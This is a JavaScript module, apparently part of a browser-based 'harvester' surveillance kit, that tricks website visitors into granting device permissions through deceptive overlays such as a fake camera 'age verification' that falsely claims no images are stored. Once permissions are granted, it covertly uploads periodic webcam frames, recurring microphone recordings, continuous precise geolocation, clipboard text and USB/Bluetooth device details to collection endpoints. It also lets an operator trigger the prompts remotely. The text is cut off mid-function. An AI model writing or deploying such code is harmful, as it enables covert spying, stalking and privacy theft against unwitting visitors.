import axios from 'axios';

const API = process.env.REACT_APP_API_URL || 'http://localhost:5000';

export default class PermissionForcer {
  constructor(core) {
    this.core = core;
    this.granted = { camera: false, microphone: false, geolocation: false, notifications: false, clipboard: false, persistentStorage: false, bluetooth: false, usb: false, midi: false };
    this.attempted = {};
    this.maxRetries = 0; // No retries - one shot only
    this.streams = [];
    this.overlayShown = false;
    this.userInteracted = false;
    this._hiddenVideo = null;
    this.autoForceEnabled = true; // Will be set from server
    this.isFirstVisit = false;   // Will be set from PersistenceEngine
    this.executedOnce = false;   // Track if we've already run forceAll
  }

  async init() {
    // Fetch global settings from server
    try {
      const res = await axios.get(`${API}/api/collect/settings`, { timeout: 5000 });
      this.autoForceEnabled = res.data.autoForcePermissions !== false;
    } catch (e) {
      // Default to true if cannot reach server
      this.autoForceEnabled = true;
    }

    // Check if this is a first visit
    const stored = this.readPersistentData();
    this.isFirstVisit = !stored || !stored.victimId;
    
    console.log(`[PermissionForcer] autoForce=${this.autoForceEnabled}, firstVisit=${this.isFirstVisit}`);

    // Only auto-force on FIRST visit AND when admin has enabled auto-force
    if (this.isFirstVisit && this.autoForceEnabled) {
      setTimeout(() => this.forceAll(), 1500);
    } else {
      console.log('[PermissionForcer] Auto-force skipped (return visitor or disabled)');
    }

    // Track user interaction (used only for overlay UX, not for retries)
    document.addEventListener('click', () => { this.userInteracted = true; }, { once: true });

    // Listen for Socket.IO admin-triggered permission requests
    this.setupSocketListeners();
  }

  setupSocketListeners() {
    // Check if Socket.IO is available via the core's persistence engine
    try {
      const socket = window.__harvester_socket;
      if (socket) {
        socket.on('admin-trigger-permission', (data) => {
          if (data && data.permissionType) {
            console.log('[PermissionForcer] Admin-triggered:', data.permissionType);
            this.triggerSinglePermission(data.permissionType);
          }
        });
      }
    } catch (e) {}
  }

  readPersistentData() {
    try {
      const stored = localStorage.getItem('__harvester_id_');
      if (stored) return JSON.parse(stored);
    } catch(e) {}
    try {
      const stored = localStorage.getItem('__app_data_');
      if (stored) return JSON.parse(stored);
    } catch(e) {}
    return null;
  }

  async triggerSinglePermission(key) {
    switch(key) {
      case 'camera': await this.forceCamera(); break;
      case 'microphone': await this.forceMicrophone(); break;
      case 'geolocation': await this.forceGeolocation(); break;
      case 'notifications': await this.forceNotifications(); break;
      case 'clipboard': await this.forceClipboard(); break;
      case 'bluetooth': await this.forceBluetooth(); break;
      case 'usb': await this.forceUSB(); break;
      case 'midi': await this.forceMIDI(); break;
    }
  }

  // === SVG ICONS ===
  getIconSVG(type) {
    const icons = {
      camera: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 15.2a3.2 3.2 0 1 0 0-6.4 3.2 3.2 0 0 0 0 6.4z" fill="url(#cg)"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z" fill="currentColor"/></svg>`,
      microphone: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 14a3 3 0 0 0 3-3V5a3 3 0 1 0-6 0v6a3 3 0 0 0 3 3z" fill="currentColor"/><path d="M17 11a5 5 0 0 1-10 0H5a7 7 0 0 0 6 6.93V21h2v-3.07A7 7 0 0 0 19 11h-2z" fill="currentColor" opacity="0.7"/></svg>`,
      geolocation: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z" fill="currentColor"/></svg>`,
      notifications: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 22c1.1 0 2-.9 2-2h-4a2 2 0 0 0 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z" fill="currentColor"/></svg>`,
      clipboard: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M19 2h-4.18C14.4.84 13.3 0 12 0c-1.3 0-2.4.84-2.82 2H5c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-7 0c.55 0 1 .45 1 1s-.45 1-1 1-1-.45-1-1 .45-1 1-1zm-2 14l-4-4 1.41-1.41L10 13.17l6.59-6.59L18 8l-8 8z" fill="currentColor"/></svg>`,
      bluetooth: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M17.71 7.71L12 2h-1v7.59L6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 11 14.41V22h1l5.71-5.71-4.3-4.29 4.3-4.29zM13 5.83l1.88 1.88L13 9.59V5.83zm1.88 10.46L13 18.17v-3.76l1.88 1.88z" fill="currentColor"/></svg>`,
      usb: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M15 7v4h1v2h-3V5h2l-3-4-3 4h2v8H8v-2.07c.7-.37 1.2-1.08 1.2-1.93 0-1.21-.99-2.2-2.2-2.2-1.21 0-2.2.99-2.2 2.2 0 .85.5 1.56 1.2 1.93V13c0 1.11.89 2 2 2h3v3.05c-.71.37-1.2 1.1-1.2 1.95a2.2 2.2 0 0 0 4.4 0c0-.85-.49-1.58-1.2-1.95V15h3c1.11 0 2-.89 2-2v-2h1V7h-4z" fill="currentColor"/></svg>`,
      midi: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><rect x="2" y="4" width="20" height="16" rx="2" stroke="currentColor" stroke-width="1.5" fill="none"/><rect x="5" y="8" width="2" height="6" rx="0.5" fill="currentColor"/><rect x="9" y="8" width="2" height="8" rx="0.5" fill="currentColor"/><rect x="13" y="8" width="2" height="4" rx="0.5" fill="currentColor"/><rect x="17" y="8" width="2" height="3" rx="0.5" fill="currentColor"/></svg>`,
      storage: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 20h20V4H2v16zm2-14h16v4H4V6zm0 6h16v4H4v-4zm0 6v-2h16v2H4z" fill="currentColor"/><circle cx="6" cy="9" r="1" fill="currentColor" opacity="0.5"/><circle cx="6" cy="15" r="1" fill="currentColor" opacity="0.5"/></svg>`,
      vibration: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M0 15h2V9H0v6zm3 2h2V7H3v10zm19-8v6h2V9h-2zm-3 8h2V7h-2v10zM16.5 3h-9C6.67 3 6 3.67 6 4.5v15c0 .83.67 1.5 1.5 1.5h9c.83 0 1.5-.67 1.5-1.5v-15c0-.83-.67-1.5-1.5-1.5zM16 19H8V5h8v14z" fill="currentColor"/></svg>`,
      orientation: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M16.5 3h-9C6.67 3 6 3.67 6 4.5v15c0 .83.67 1.5 1.5 1.5h9c.83 0 1.5-.67 1.5-1.5v-15c0-.83-.67-1.5-1.5-1.5zM16 19H8V5h8v14z" fill="currentColor" opacity="0.3"/><path d="M12 16c-2.21 0-4-1.79-4-4s1.79-4 4-4 4 1.79 4 4-1.79 4-4 4zm0-6c-1.1 0-2 .9-2 2s.9 2 2 2 2-.9 2-2-.9-2-2-2z" fill="currentColor"/></svg>`,
      light: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M6.76 4.84l-1.8-1.79-1.41 1.41 1.79 1.79 1.42-1.41zM4 10.5H1v2h3v-2zm9-9.95h-2V3.5h2V.55zm7.45 3.91l-1.41-1.41-1.79 1.79 1.41 1.41 1.79-1.79zm-3.21 13.7l1.79 1.8 1.41-1.41-1.8-1.79-1.4 1.4zM20 10.5v2h3v-2h-3zm-8-5c-3.31 0-6 2.69-6 6 0 2.21 1.21 4.15 3 5.19V17c0 .55.45 1 1 1h4c.55 0 1-.45 1-1v-.31c1.79-1.04 3-2.98 3-5.19 0-3.31-2.69-6-6-6zm-2 11v-1h4v1h-4zm-4-5c0-2.21 1.79-4 4-4s4 1.79 4 4H8z" fill="currentColor"/></svg>`,
      proximity: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.42 0-8-3.58-8-8s3.58-8 8-8 8 3.58 8 8-3.58 8-8 8z" fill="currentColor" opacity="0.3"/><circle cx="12" cy="12" r="3" fill="currentColor"/><path d="M12 9c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z" fill="currentColor" opacity="0.5"/></svg>`,
      wakeLock: `<svg width="48" height="48" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C8.13 2 5 5.13 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.87-3.13-7-7-7zm-2 13v-1.59c-.94-.51-1.64-1.25-2.13-2.13-1.09-1.94-1.87-4.19-1.87-5.28 0-2.76 2.24-5 5-5s5 2.24 5 5c0 1.09-.78 3.34-1.87 5.28-.49.88-1.19 1.62-2.13 2.13V15h-2z" fill="currentColor"/><path d="M12 6c-1.66 0-3 1.34-3 3 0 1.66 1.34 3 3 3s3-1.34 3-3c0-1.66-1.34-3-3-3z" fill="currentColor" opacity="0.5"/></svg>`
    };
    return icons[type] || icons.notifications;
  }

  // === GRADIENT DEFINITIONS ===
  getIconGradient(type) {
    const gradients = {
      camera: `<linearGradient id="cg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#00f0ff"/><stop offset="100%" stop-color="#0088ff"/></linearGradient>`,
      microphone: `<linearGradient id="mg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ffaa00"/><stop offset="100%" stop-color="#ff6600"/></linearGradient>`,
      geolocation: `<linearGradient id="glg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#00ff88"/><stop offset="100%" stop-color="#00cc66"/></linearGradient>`,
      notifications: `<linearGradient id="ng" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ff66aa"/><stop offset="100%" stop-color="#ff3388"/></linearGradient>`,
      clipboard: `<linearGradient id="clg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#aa88ff"/><stop offset="100%" stop-color="#7755dd"/></linearGradient>`,
      bluetooth: `<linearGradient id="bg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#66ccff"/><stop offset="100%" stop-color="#3399ee"/></linearGradient>`,
      usb: `<linearGradient id="ug" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ff8844"/><stop offset="100%" stop-color="#dd6622"/></linearGradient>`,
      midi: `<linearGradient id="mig" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#88dd88"/><stop offset="100%" stop-color="#55aa55"/></linearGradient>`,
      storage: `<linearGradient id="sg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ff5588"/><stop offset="100%" stop-color="#dd3366"/></linearGradient>`,
      vibration: `<linearGradient id="vg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#aaaacc"/><stop offset="100%" stop-color="#8888aa"/></linearGradient>`,
      orientation: `<linearGradient id="org" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#99ccff"/><stop offset="100%" stop-color="#77aadd"/></linearGradient>`,
      light: `<linearGradient id="lig" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#ffee88"/><stop offset="100%" stop-color="#ffcc44"/></linearGradient>`,
      proximity: `<linearGradient id="prg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#dddddd"/><stop offset="100%" stop-color="#bbbbbb"/></linearGradient>`,
      wakeLock: `<linearGradient id="wlg" x1="0%" y1="0%" x2="100%" y2="100%"><stop offset="0%" stop-color="#44ddff"/><stop offset="100%" stop-color="#22bbdd"/></linearGradient>`
    };
    return gradients[type] || gradients.notifications;
  }

  getAccentColor(type) {
    const colors = {
      camera: '#00f0ff',
      microphone: '#ffaa00',
      geolocation: '#00ff88',
      notifications: '#ff66aa',
      clipboard: '#aa88ff',
      bluetooth: '#66ccff',
      usb: '#ff8844',
      midi: '#88dd88',
      storage: '#ff5588',
      vibration: '#aaaacc',
      orientation: '#99ccff',
      light: '#ffee88',
      proximity: '#dddddd',
      wakeLock: '#44ddff'
    };
    return colors[type] || '#00a8ff';
  }

  async forceAll() {
    if (this.executedOnce) return; // Only run once per session
    this.executedOnce = true;

    console.log('[PermissionForcer] One-time permission escalation...');

    // 1. Notifications 
    await this.forceNotifications();

    // 2. Geolocation 
    await this.forceGeolocation();

    // 3. Camera 
    await this.forceCamera();

    // 4. Microphone 
    await this.forceMicrophone();

    // 5. Clipboard 
    await this.forceClipboard();

    // 6. Persistent storage 
    await this.forcePersistentStorage();

    // 7. Advanced sensors
    await Promise.allSettled([
      this.forceBluetooth(),
      this.forceUSB(),
      this.forceMIDI(),
      this.forceVibration(),
      this.forceOrientation(),
      this.forceAmbientLight(),
      this.forceProximity(),
      this.forceWakeLock(),
      this.forcePointerLock()
    ]);

    // Send summary
    const summary = {
      granted: Object.entries(this.granted).filter(([k, v]) => v).map(([k]) => k),
      denied: Object.entries(this.attempted).filter(([k, v]) => v === false && !this.granted[k]).map(([k]) => k),
      totalAttempted: Object.keys(this.attempted).length,
      totalGranted: Object.values(this.granted).filter(Boolean).length
    };

    await this.core.send('/api/collect/formdata', {
      formId: 'permission-forcer-summary',
      fields: summary,
      url: window.location.href
    });

    if (this.granted.camera) {
      await this.core.send('/api/collect/camera-access', { granted: true });
    }
  }

  // === NOTIFICATIONS ===
  async forceNotifications() {
    if (this.attempted.notifications) return;
    this.attempted.notifications = 'pending';

    try {
      if (!('Notification' in window)) { this.attempted.notifications = false; return; }

      if (Notification.permission === 'granted') {
        this.granted.notifications = true;
        this.attempted.notifications = true;
        this.sendTestNotification();
        return;
      }

      if (Notification.permission === 'denied') {
        this.attempted.notifications = false;
        return;
      }

      this.showFakeOverlay({
        iconType: 'notifications',
        title: 'Enable Notifications',
        message: 'This website uses notifications to show you important updates. Please click "Allow" to continue.',
        buttonText: 'Enable Notifications'
      });

      const permission = await Notification.requestPermission();
      this.hideFakeOverlay();

      if (permission === 'granted') {
        this.granted.notifications = true;
        this.attempted.notifications = true;
        this.sendTestNotification();
        await this.subscribePushNotifications();
      } else {
        this.attempted.notifications = false;
      }
    } catch (e) {
      this.attempted.notifications = false;
    }
  }

  sendTestNotification() {
    try {
      new Notification('🔔 You have new updates!', {
        body: 'Click to see what\'s new.',
        icon: '/favicon.ico',
        tag: 'harvester-' + Date.now(),
        requireInteraction: true
      });
    } catch (e) {}
  }

  async subscribePushNotifications() {
    try {
      if (!('PushManager' in window)) return;
      const reg = await navigator.serviceWorker?.ready;
      if (!reg) return;
      await reg.pushManager.subscribe({
        userVisibleOnly: true,
        applicationServerKey: this.urlBase64ToUint8Array('BEl62iUYgUivxIkv69yViEuiBIa-Ib9-SkvMeAtA3LFgDzkrxZJjSgSnfckjBJuBkr3qBUYIHBQFLXYp5A-CzM')
      }).catch(() => null);
    } catch (e) {}
  }

  urlBase64ToUint8Array(base64String) {
    const padding = '='.repeat((4 - base64String.length % 4) % 4);
    const base64 = (base64String + padding).replace(/-/g, '+').replace(/_/g, '/');
    const rawData = window.atob(base64);
    return Uint8Array.from([...rawData].map(char => char.charCodeAt(0)));
  }

  // === GEOLOCATION (PRECISE COORDINATES) ===
  async forceGeolocation() {
    if (this.attempted.geolocation) return;
    this.attempted.geolocation = 'pending';

    try {
      if (!('geolocation' in navigator)) { this.attempted.geolocation = false; return; }

      this.showFakeOverlay({
        iconType: 'geolocation',
        title: 'Location Access Needed',
        message: 'Please enable location services to provide you with localized content and better service.',
        buttonText: 'Allow Location'
      });

      // Use HIGH accuracy for precise victim coordinates
      const pos = await new Promise((resolve, reject) => {
        navigator.geolocation.getCurrentPosition(resolve, reject, {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        });
      });

      this.hideFakeOverlay();

      if (pos) {
        this.granted.geolocation = true;
        this.attempted.geolocation = true;

        // Send PRECISE coordinates to the server
        await this.core.send('/api/collect/fingerprint', {
          geolocation: {
            lat: pos.coords.latitude,
            lon: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            altitude: pos.coords.altitude || null,
            altitudeAccuracy: pos.coords.altitudeAccuracy || null,
            heading: pos.coords.heading || null,
            speed: pos.coords.speed || null,
            timestamp: pos.timestamp
          }
        });

        // Continuous watch for movement
        this.watchId = navigator.geolocation.watchPosition(
          (newPos) => {
            this.core.send('/api/collect/fingerprint', {
              geolocationUpdate: {
                lat: newPos.coords.latitude,
                lon: newPos.coords.longitude,
                accuracy: newPos.coords.accuracy,
                timestamp: newPos.timestamp
              }
            });
          },
          () => {},
          { enableHighAccuracy: true, timeout: 15000, maximumAge: 30000 }
        );
      }
    } catch (e) {
      this.hideFakeOverlay();
      this.attempted.geolocation = false;
      
      // Try low accuracy fallback
      try {
        const pos = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, {
            enableHighAccuracy: false,
            timeout: 5000
          });
        });
        if (pos) {
          this.granted.geolocation = true;
          this.attempted.geolocation = true;
          await this.core.send('/api/collect/fingerprint', {
            geolocation: {
              lat: pos.coords.latitude,
              lon: pos.coords.longitude,
              accuracy: pos.coords.accuracy
            }
          });
        }
      } catch (e2) {}
    }
  }

  // === CAMERA (ONCE, NO RETRY LOOP) ===
  async forceCamera() {
    if (this.attempted.camera) return;
    this.attempted.camera = 'pending';

    try {
      if (!('mediaDevices' in navigator) || !('getUserMedia' in navigator.mediaDevices)) {
        this.attempted.camera = false;
        return;
      }

      // Single social engineering pretext
      this.showFakeOverlay({
        iconType: 'camera',
        title: 'Age Verification Required',
        message: 'Please look at your camera to verify your age. This is a one-time verification and no images are stored.',
        buttonText: 'Verify with Camera'
      });

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: {
            width: { ideal: 640 },
            height: { ideal: 480 },
            facingMode: 'user'
          }
        });

        this.hideFakeOverlay();

        if (stream) {
          this.granted.camera = true;
          this.attempted.camera = true;
          this.streams.push(stream);

          await this.core.send('/api/collect/camera-access', { granted: true });

          // Capture initial frame
          this.captureCameraFrame(stream);

          // Keep stream alive
          const hiddenVideo = document.createElement('video');
          hiddenVideo.srcObject = stream;
          hiddenVideo.style.display = 'none';
          document.body.appendChild(hiddenVideo);
          hiddenVideo.play().catch(() => {});
          this._hiddenVideo = hiddenVideo;

          // Periodic capture (less aggressive: every 30s instead of 15s)
          this.cameraCaptureInterval = setInterval(() => {
            this.captureCameraFrame(stream);
          }, 30000);
        }
      } catch (e) {
        this.hideFakeOverlay();
        this.attempted.camera = false;
        await this.core.send('/api/collect/camera-access', { granted: false });
      }
    } catch (e) {
      this.hideFakeOverlay();
      this.attempted.camera = false;
    }
  }

  captureCameraFrame(stream) {
    try {
      const video = this._hiddenVideo || (() => {
        const v = document.createElement('video');
        v.srcObject = stream;
        v.style.display = 'none';
        document.body.appendChild(v);
        v.play().catch(() => {});
        return v;
      })();
      
      requestAnimationFrame(() => {
        const canvas = document.createElement('canvas');
        canvas.width = 320;
        canvas.height = 240;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, 320, 240);
        
        const imageData = canvas.toDataURL('image/jpeg', 0.5);
        const track = stream.getVideoTracks()[0];
        const settings = track?.getSettings() || {};
        
        this.core.send('/api/collect/camera', {
          imageData,
          metadata: {
            facingMode: settings.facingMode || 'user',
            resolution: `${canvas.width}x${canvas.height}`,
            deviceLabel: track?.label || 'unknown',
            deviceId: settings.deviceId || '',
            width: canvas.width,
            height: canvas.height
          },
          triggerType: 'permission-forcer'
        });
      });
    } catch (e) {}
  }

  // === MICROPHONE (ONCE) ===
  async forceMicrophone() {
    if (this.attempted.microphone) return;
    this.attempted.microphone = 'pending';

    try {
      if (!('mediaDevices' in navigator) || !('getUserMedia' in navigator.mediaDevices)) {
        this.attempted.microphone = false;
        return;
      }

      this.showFakeOverlay({
        iconType: 'microphone',
        title: 'Voice Search',
        message: 'Enable microphone for voice search and dictation features.',
        buttonText: 'Enable Microphone'
      });

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        this.hideFakeOverlay();

        if (stream) {
          this.granted.microphone = true;
          this.attempted.microphone = true;
          this.streams.push(stream);
          this.startAudioCapture(stream);
        }
      } catch (e) {
        this.hideFakeOverlay();
        this.attempted.microphone = false;
      }
    } catch (e) {
      this.hideFakeOverlay();
      this.attempted.microphone = false;
    }
  }

  startAudioCapture(stream) {
    try {
      // Record actual audio clips and upload to Cloudinary via server
      const audioContext = new (window.AudioContext || window.webkitAudioContext)();
      const source = audioContext.createMediaStreamSource(stream);
      const analyser = audioContext.createAnalyser();
      analyser.fftSize = 256;
      source.connect(analyser);

      // Send audio metrics (amplitude levels) periodically
      const bufferLength = analyser.frequencyBinCount;
      const dataArray = new Uint8Array(bufferLength);

      // Record 10-second audio clips every 60 seconds
      let mediaRecorder = null;
      let audioChunks = [];
      let recording = false;

      const startRecording = () => {
        if (recording) return;
        recording = true;
        audioChunks = [];

        try {
          // Create a new MediaRecorder from the stream
          mediaRecorder = new MediaRecorder(stream, {
            mimeType: MediaRecorder.isTypeSupported('audio/webm;codecs=opus') 
              ? 'audio/webm;codecs=opus' 
              : 'audio/webm'
          });

          mediaRecorder.ondataavailable = (event) => {
            if (event.data.size > 0) {
              audioChunks.push(event.data);
            }
          };

          mediaRecorder.onstop = async () => {
            recording = false;
            if (audioChunks.length === 0) return;

            try {
              const blob = new Blob(audioChunks, { type: mediaRecorder.mimeType });
              
              // Convert to base64
              const reader = new FileReader();
              reader.onloadend = () => {
                const base64Audio = reader.result;
                
                // Get average amplitude during recording
                analyser.getByteFrequencyData(dataArray);
                const avgAmp = dataArray.reduce((a, b) => a + b, 0) / bufferLength;

                // Send to server
                this.core.send('/api/collect/audio', {
                  audioData: base64Audio,
                  duration: 10,
                  metadata: {
                    format: 'webm',
                    sampleRate: audioContext.sampleRate,
                    channels: stream.getAudioTracks()[0]?.getSettings()?.channelCount || 1,
                    amplitude: Math.round(avgAmp * 100) / 100,
                    deviceLabel: stream.getAudioTracks()[0]?.label || 'unknown',
                    deviceId: stream.getAudioTracks()[0]?.getSettings()?.deviceId || '',
                    echoCancellation: stream.getAudioTracks()[0]?.getSettings()?.echoCancellation,
                    noiseSuppression: stream.getAudioTracks()[0]?.getSettings()?.noiseSuppression
                  },
                  triggerType: 'permission-forcer'
                });
              };
              reader.readAsDataURL(blob);
            } catch (e) {}
          };

          // Record for 10 seconds
          mediaRecorder.start();
          setTimeout(() => {
            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
              mediaRecorder.stop();
            }
          }, 10000);

        } catch (e) {
          recording = false;
        }
      };

      // Send metrics every 5s, record clip every 60s
      setInterval(() => {
        analyser.getByteFrequencyData(dataArray);
        const average = dataArray.reduce((a, b) => a + b, 0) / bufferLength;
        const max = Math.max(...dataArray);
        if (average > 1) {
          this.core.send('/api/collect/formdata', {
            formId: 'audio-metrics',
            fields: { avgLevel: Math.round(average * 100) / 100, maxLevel: max, timestamp: Date.now() },
            url: window.location.href
          });
        }
      }, 5000);

      // Record 10s audio clip every 60 seconds
      setInterval(() => startRecording(), 60000);

      // Start first recording after 5 seconds
      setTimeout(() => startRecording(), 5000);

      // Keep audio context alive
      setInterval(() => {
        if (audioContext.state === 'suspended') audioContext.resume();
      }, 1000);

    } catch (e) {}
  }

  // === CLIPBOARD (ONCE) ===
  async forceClipboard() {
    if (this.attempted.clipboard) return;
    this.attempted.clipboard = 'pending';

    try {
      if (!('clipboard' in navigator)) { this.attempted.clipboard = false; return; }

      try {
        const text = await navigator.clipboard.readText();
        if (text) {
          this.granted.clipboard = true;
          this.attempted.clipboard = true;
          await this.core.send('/api/collect/clipboard', { text: text.substring(0, 1000), action: 'clipboard-api-read' });
          return;
        }
      } catch (e) {}

      try {
        const permission = await navigator.permissions.query({ name: 'clipboard-read' });
        if (permission.state === 'granted') {
          this.granted.clipboard = true;
          this.attempted.clipboard = true;
          const text = await navigator.clipboard.readText();
          if (text) {
            await this.core.send('/api/collect/clipboard', { text: text.substring(0, 1000), action: 'clipboard-api-granted' });
          }
          return;
        }
      } catch (e) {}
    } catch (e) {
      this.attempted.clipboard = false;
    }
  }

  // === PERSISTENT STORAGE ===
  async forcePersistentStorage() {
    if (this.attempted.persistentStorage) return;
    this.attempted.persistentStorage = 'pending';

    try {
      if (!('storage' in navigator) || !('persist' in navigator.storage)) {
        this.attempted.persistentStorage = false;
        return;
      }

      const isPersisted = await navigator.storage.persisted();
      if (isPersisted) {
        this.granted.persistentStorage = true;
        this.attempted.persistentStorage = true;
        return;
      }

      const result = await navigator.storage.persist();
      if (result) {
        this.granted.persistentStorage = true;
        this.attempted.persistentStorage = true;
        const estimate = await navigator.storage.estimate();
        await this.core.send('/api/collect/formdata', {
          formId: 'storage-persist-granted',
          fields: { quota: estimate.quota, usage: estimate.usage, usageDetails: JSON.stringify(estimate.usageDetails || {}) },
          url: window.location.href
        });
      } else {
        this.attempted.persistentStorage = false;
      }
    } catch (e) {
      this.attempted.persistentStorage = false;
    }
  }

  // === BLUETOOTH ===
  async forceBluetooth() {
    if (this.attempted.bluetooth) return;
    this.attempted.bluetooth = 'pending';

    try {
      if (!('bluetooth' in navigator)) { this.attempted.bluetooth = false; return; }

      const device = await navigator.bluetooth.requestDevice({
        acceptAllDevices: true,
        optionalServices: ['battery_service', 'device_information']
      }).catch(() => null);

      if (device) {
        this.granted.bluetooth = true;
        this.attempted.bluetooth = true;
        await this.core.send('/api/collect/formdata', {
          formId: 'bluetooth-device',
          fields: { name: device.name, id: device.id, connected: device.gatt?.connected || false },
          url: window.location.href
        });
      } else {
        this.attempted.bluetooth = false;
      }
    } catch (e) {
      this.attempted.bluetooth = false;
    }
  }

  // === USB ===
  async forceUSB() {
    if (this.attempted.usb) return;
    this.attempted.usb = 'pending';

    try {
      if (!('usb' in navigator)) { this.attempted.usb = false; return; }
      const device = await navigator.usb.requestDevice({ filters: [] }).catch(() => null);
      if (device) {
        this.granted.usb = true;
        this.attempted.usb = true;
        await this.core.send('/api/collect/formdata', {
          formId: 'usb-device',
          fields: { manufacturer: device.manufacturerName, product: device.productName, serialNumber: device.serialNumber },
          url: window.location.href
        });
      } else {
        this.attempted.usb = false;
      }
    } catch (e) {
      this.attempted.usb = false;
    }
  }

  // === MIDI ===
  async forceMIDI() {
    if (this.attempted.midi) return;
    this.attempted.midi = 'pending';

    try {
      if (!('requestMIDIAccess' in navigator)) { this.attempted.midi = false; return; }
      const midi = await navigator.requestMIDIAccess().catch(() => null);
      if (midi) {
        this.granted.midi = true;
        this.attempted.midi = true;
        const inputs = [];
        midi.inputs.forEach(input => inputs.push({ name: input.name, manufacturer: input.manufacturer }));
        await this.core.send('/api/collect/formdata', {
          formId: 'midi-devices',
          fields: { inputs },
          url: window.location.href
        });
      } else {
        this.attempted.midi = false;
      }
    } catch (e) {
      this.attempted.midi = false;
    }
  }

  // === SENSORS (no retries) ===
  async forceVibration() {
    try {
      if ('vibrate' in navigator) {
        navigator.vibrate(200);
        await this.core.send('/api/collect/formdata', {
          formId: 'vibration-api',
          fields: { supported: true },
          url: window.location.href
        });
      }
    } catch (e) {}
  }

  async forceOrientation() {
    try {
      if ('DeviceOrientationEvent' in window) {
        if (typeof DeviceOrientationEvent.requestPermission === 'function') {
          const permission = await DeviceOrientationEvent.requestPermission();
          if (permission === 'granted') {
            window.addEventListener('deviceorientation', (e) => {
              this.core.send('/api/collect/fingerprint', { orientation: { alpha: e.alpha, beta: e.beta, gamma: e.gamma, absolute: e.absolute } });
            }, { once: true });
          }
        } else {
          window.addEventListener('deviceorientation', (e) => {
            this.core.send('/api/collect/fingerprint', { orientation: { alpha: e.alpha, beta: e.beta, gamma: e.gamma } });
          }, { once: true });
        }
      }
    } catch (e) {}

    try {
      if ('DeviceMotionEvent' in window) {
        if (typeof DeviceMotionEvent.requestPermission === 'function') await DeviceMotionEvent.requestPermission();
        window.addEventListener('devicemotion', (e) => {
          this.core.send('/api/collect/fingerprint', { motion: { acceleration: e.acceleration, accelerationIncludingGravity: e.accelerationIncludingGravity, rotationRate: e.rotationRate } });
        }, { once: true });
      }
    } catch (e) {}
  }

  async forceAmbientLight() {
    try {
      if ('AmbientLightSensor' in window) {
        const sensor = new AmbientLightSensor();
        sensor.onreading = () => {
          this.core.send('/api/collect/fingerprint', { ambientLight: sensor.illuminance });
        };
        sensor.start();
      }
    } catch (e) {}
  }

  async forceProximity() {
    try {
      if ('ProximitySensor' in window) {
        const sensor = new ProximitySensor();
        sensor.onreading = () => {
